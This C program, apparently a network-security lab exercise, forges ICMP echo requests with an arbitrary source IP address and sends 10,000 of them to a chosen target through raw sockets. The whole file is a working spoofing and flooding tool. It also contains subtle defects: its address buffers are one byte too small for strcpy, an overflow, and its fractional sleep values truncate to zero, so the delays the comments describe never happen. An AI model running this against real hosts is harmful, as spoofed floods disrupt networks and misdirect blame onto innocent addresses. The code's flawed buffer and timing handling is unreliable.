#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "myheader.h"

unsigned short in_cksum (unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader* ip);

/******************************************************************
  Spoof an ICMP echo request using an arbitrary source IP Address
*******************************************************************/
int main(int argc, char *argv[]) {
   char buffer[2000];

   if(argc < 3){
    printf("Format = ./<file_name>, <sender_ip>, <reciever_ip>\n");
    exit(1);
   }
   char sender_ip[strlen(argv[1])];
   strcpy(sender_ip,argv[1]);

   char destination_ip[strlen(argv[2])];
   strcpy(destination_ip,argv[2]);

   printf("%s, %s\n",sender_ip,destination_ip);

   memset(buffer, 0, 2000);

   strcpy(buffer + sizeof(struct icmpheader) + sizeof(struct ipheader),"This is nice");
   /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
   struct icmpheader *icmp = (struct icmpheader *)
                             (buffer + sizeof(struct ipheader));
   icmp->icmp_type = 8; //ICMP Type: 8 is request, 0 is reply.

   // Calculate the checksum for integrity
   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader) + strlen("This is nice"));

   printf("icmp_chksum -> %d\n",ntohs(icmp->icmp_chksum)); //network to host, big endian-> little //dorkar nai.

   /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
   struct ipheader *ip = (struct ipheader *) buffer;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 200; //normal 64
   ip->iph_sourceip.s_addr = inet_addr(sender_ip);
   ip->iph_destip.s_addr = inet_addr(destination_ip);
   ip->iph_protocol = IPPROTO_ICMP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader)+strlen("This is nice"));

    unsigned int time_to_sleep = 0.5; //same as ttl
   /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/
   for(int i = 0; i < 10000; i++){
    printf("Sending packet -> %d\n",(i+1));
    send_raw_ip_packet (ip);
    while(time_to_sleep){

      time_to_sleep = sleep(time_to_sleep);
    }
    time_to_sleep = 0.2;
   }
   

   return 0;
}

